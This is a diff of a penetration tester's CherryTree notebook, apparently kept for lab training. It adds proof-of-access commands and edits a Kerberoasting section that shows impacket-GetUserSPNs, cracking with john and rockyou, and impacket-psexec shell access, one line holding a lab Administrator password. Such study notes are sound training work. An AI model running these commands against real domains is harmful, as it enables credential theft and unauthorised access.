@@ -102,7 +102,14 @@ Exploit POC:</rich_text>
     <node name="Goodies" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="0" custom_icon_id="43" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1684267948">
       <node name="Hashes" unique_id="9" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="1" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1492949998"/>
       <node name="Passwords" unique_id="5" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1492950150"/>
-      <node name="Proof\Flags\Other" unique_id="6" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1496953479"/>
+      <node name="Proof\Flags\Other" unique_id="6" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="1" custom_icon_id="18" is_bold="0" foreground="" ts_creation="0" ts_lastsave="1697242100">
+        <rich_text>
+Linux Proof: </rich_text>
+        <rich_text family="monospace">cat proof.txt &amp;&amp; hostname &amp;&amp; id &amp;&amp; whoami &amp;&amp; /sbin/ifconfig</rich_text>
+        <rich_text>
+Windows Proof: </rich_text>
+        <rich_text family="monospace">hostname &amp;&amp; whoami.exe &amp;&amp; whoami.exe /groups &amp;&amp; type proof.txt &amp;&amp; ipconfig /all</rich_text>
+      </node>
     </node>
     <node name="Methodology" unique_id="29" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684267948" ts_lastsave="1687690629">
       <rich_text>
@@ -1631,7 +1638,7 @@ python3 /opt/impacket/examples/GetNPUsers.py domain.local/admin -request -no-pas
             <codebox char_offset="48" justification="left" frame_width="1682" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
 Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)</codebox>
           </node>
-          <node name="Kerberoasting" unique_id="101" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697239770" ts_lastsave="1697242025">
+          <node name="Kerberoasting" unique_id="101" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697239770" ts_lastsave="1697242037">
             <rich_text>• </rich_text>
             <rich_text link="webs https://adsecurity.org/?p=3458">https://adsecurity.org/?p=3458</rich_text>
             <rich_text>
@@ -1669,13 +1676,16 @@ once done we can crack it using john
 
 once we get the password we should use psexec to get a shell
 
-
+</rich_text>
+            <rich_text justification="left"></rich_text>
+            <rich_text>
 Ex:
 </rich_text>
+            <rich_text justification="left"></rich_text>
             <codebox char_offset="224" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-GetUserSPNs -hashes &lt;lmhash&gt;:&lt;nthash&gt; htb.local/username -outputfile hashes.txt</codebox>
             <codebox char_offset="233" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-GetUserSPNs -request -dc-ip 10.11.1. &lt;DOMAIN.FULL&gt;/&lt;USERNAME&gt; -outputfile hashes.kerberoast</codebox>
             <codebox char_offset="275" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">john admin.txt --wordlist=/usr/share/wordlists/rockyou.txt</codebox>
-            <codebox char_offset="341" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec /&lt;user&gt;:&lt;Password&gt;8@10.10.10.100</codebox>
+            <codebox char_offset="341" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec /&lt;user&gt;:&lt;Password&gt;@10.11.1.</codebox>
             <codebox char_offset="347" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec /Administrator:Ticketmaster1968@10.11.1.</codebox>
           </node>
         </node>
